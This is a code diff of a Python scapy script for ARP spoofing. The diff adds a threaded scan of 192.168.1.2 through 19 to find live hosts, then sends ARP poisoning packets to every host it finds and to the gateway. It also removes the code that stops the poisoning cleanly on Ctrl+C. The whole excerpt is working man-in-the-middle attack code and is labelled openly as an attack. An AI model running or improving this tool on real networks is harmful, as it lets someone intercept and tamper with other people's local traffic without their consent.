@@ -13,21 +13,32 @@ from scapy.all import *
 IP = 0
 MAC = TARGET = 1
 
+# riesenie threadu zo stack overflow  - https://stackoverflow.com/questions/6893968/how-to-get-the-return-value-from-a-thread-in-python
+class ThreadWithReturnValue(Thread):
+    def __init__(self, group=None, target=None, name=None,
+                 args=(), kwargs={}, Verbose=None):
+        Thread.__init__(self, group, target, name, args, kwargs)
+        self._return = None
+    def run(self):
+        if self._target is not None:
+            self._return = self._target(*self._args,
+                                                **self._kwargs)
+    def join(self, *args):
+        Thread.join(self, *args)
+        return self._return
 
 
 def get_MAC(interface, target_IP):
-    # get the MAC address of target_IP and return it
-    print(interface, target_IP)
-    
+    # print(interface, target_IP)
     source_IP = get_if_addr(interface)
     source_MAC = get_if_hwaddr(interface)
     p = ARP(hwsrc=source_MAC, psrc=source_IP)  # ARP request by default
     p.hwdst = 'ff:ff:ff:ff:ff:ff'
     p.pdst = target_IP
-    reply, unans = sr(p, timeout=5, verbose=0)
+    reply, unans = sr(p, timeout=1, verbose=0)
     if len(unans) > 0:
-        # received no reply
-        raise Exception('Error finding MAC for %s, try using -i' % target_IP)
+        # print("Fail to obrtain MAC address")
+        return 
     return reply[0][1].hwsrc
 
 
@@ -81,41 +92,41 @@ def send_ARP(destination_IP, destination_MAC, source_IP, source_MAC):
     send(arp_packet, verbose=0)
 
 
-# args_target are comma separated IP addresses
-def spoofer(args_target):
-    print(args_target)
+def spoofer():
     gateway = "192.168.1.1"
     control_queue = queue.Queue()
     interface = "en0"
     attacker_MAC = get_if_hwaddr(interface)
+    targets = []
+    threads = []
+    threadsNum = 0
 
-    print ('Attacking from interface %s (%s)' % (interface, attacker_MAC))
-    try:
-        # targets is a list of (IP, MAC) tuples
-        targets = [(t.strip(), get_MAC(interface, t.strip())) for t in
-                   args_target.split(',')]
-    except Exception as e:
-        # Exception most likely because get_MAC failed
-        print (e)
-        sys.exit(1)
+    # print ('Attacking from interface %s (%s)' % (interface, attacker_MAC))
+    potentialTargets = []
+    for i in range(2, 20):
+        ip = "192.168.1." + str(i)
+        potentialTargets.append(ip)
 
-    try:
-        gateway = (gateway, get_MAC(interface, gateway))
-    except Exception as e:
-        print (e.message)
-        sys.exit(2)
+    for t in potentialTargets:
+        threads.append(ThreadWithReturnValue(target=get_MAC, args=(interface, t)))
+        threads[threadsNum].start()
+        time.sleep(0.01)
+        threadsNum+=1
 
+    threadsNum = 0
+    time.sleep(2)
+
+    for t in potentialTargets:  
+        mac = threads[threadsNum].join()
+        if(mac):
+            targets.append((t, mac))
+        threadsNum+=1
+
+    gateway = (gateway, get_MAC(interface, gateway))
+    print("------ start poisoning all detected IP adresses -----------")
+    print(targets)
     # create and start the poison thread
     poison_thread = threading.Thread(target=start_poison_thread,
                                      args=(targets, gateway, control_queue,
                                            attacker_MAC))
     poison_thread.start()
-
-    try:
-        while poison_thread.is_alive():
-            time.sleep(2) 
-
-    except KeyboardInterrupt:
-        # Ctrl+C detected, so let's finish the poison thread and exit
-        control_queue.put(('quit',))
-        poison_thread.join()
